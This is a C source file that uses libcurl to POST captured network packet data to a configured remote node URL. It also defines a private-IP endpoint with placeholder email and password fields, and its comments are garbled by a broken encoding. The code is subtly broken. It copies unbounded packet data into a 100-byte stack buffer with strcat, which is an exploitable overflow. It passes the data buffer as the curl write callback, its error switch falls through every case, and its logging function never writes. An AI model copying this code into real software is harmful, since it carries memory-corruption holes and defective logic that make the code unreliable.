#include "transfer.h"
#include <string.h>

#define POSTURL    "http://192.168.20.168/data"
#define POSTFIELDS "email=myemail@163.com&password=mypassword&autologin=1&submit=�� ¼&type="

#define FILENAME "data.log"
CHAR* g_node_url = NULL;

BOOL recordLog(void* buffer, int size, int nmemb, void *stream)
{
	HANDLE hFile;
	DWORD dwBytes;
	hFile = CreateFile(FILENAME, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
		OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;
	SetFilePointer(hFile, NULL, NULL, FILE_END);
	//WriteFile(hFile, buffer, size, &nmemb, NULL);
	CloseHandle(hFile);
	return TRUE;
}

BOOL TransferData(const u_char *pkt_data, unsigned int pkt_len)
{
	CURL *curl;
	CURLcode res;
	struct curl_slist *http_header = NULL;
	char szSource[100] = "data=";
	strcat(szSource, (char*)pkt_data);
	curl = curl_easy_init();
	if (!curl)
	{
		printf("curl init failed\n");
		return FALSE;
	}

	curl_easy_setopt(curl, CURLOPT_URL, g_node_url); //url��ַ
	curl_easy_setopt(curl, CURLOPT_POSTFIELDS, szSource); //post����
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, pkt_data); //�Է��ص����ݽ��в����ĺ�����ַ
	curl_easy_setopt(curl, CURLOPT_POST, 1); //�����ʷ�0��ʾ���β���Ϊpost
	curl_easy_setopt(curl, CURLOPT_VERBOSE, 1); //��ӡ������Ϣ
	curl_easy_setopt(curl, CURLOPT_HEADER, 1); //����Ӧͷ��Ϣ����Ӧ��һ�𴫸�write_data
	curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1); //����Ϊ��0,��Ӧͷ��Ϣlocation
	res = curl_easy_perform(curl);

	if (res != CURLE_OK)
	{
		switch (res)
		{
		case CURLE_UNSUPPORTED_PROTOCOL:
			printf("��֧�ֵ�Э�飬��URL��ͷ��ָ��\n");
		case CURLE_COULDNT_CONNECT:
			printf("��������Զ�̵��������ߴ���\n");
		case CURLE_HTTP_RETURNED_ERROR:
			printf("http���ش���\n");
		case CURLE_READ_ERROR:
			printf("��ȡ�����ļ�ʧ��\n");
		default:
			printf("����ֵ:%d\n",res);
		}
		return FALSE;
	}
	return TRUE;
}